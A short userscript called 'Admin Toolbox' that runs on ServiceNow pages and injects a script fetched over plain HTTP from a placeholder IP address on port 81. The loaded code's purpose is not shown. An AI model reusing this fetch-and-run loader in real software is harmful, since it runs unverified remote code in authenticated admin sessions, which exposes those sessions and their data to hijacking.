// ==UserScript==
// @name           Admin Toolbox
// @namespace      http://userscripts.org/users/120469
// @include        https://*.service-now.com/
// @include        http://*.service-now.com/
// ==/UserScript==


  function init(){
    (function(){document.body.appendChild(document.createElement('script')).src='http://<IP ADDRESS>:81/all/magicDust.js';})();
  }
  init();